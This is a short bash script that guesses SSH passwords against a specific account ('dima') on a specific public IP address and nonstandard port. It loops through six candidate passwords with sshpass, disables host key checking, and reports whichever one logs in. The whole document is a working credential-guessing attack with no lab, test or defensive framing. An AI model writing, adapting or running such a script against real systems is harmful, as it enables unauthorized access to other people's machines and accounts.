#!/bin/bash
for p in "1204" "dima1204" "dima" "predator" "1234" "admin"; do
    if sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p 6666 dima@194.177.1.240 "echo OK" 2>/dev/null; then
        echo "Password is $p"
        exit 0
    fi
done
echo "None worked"
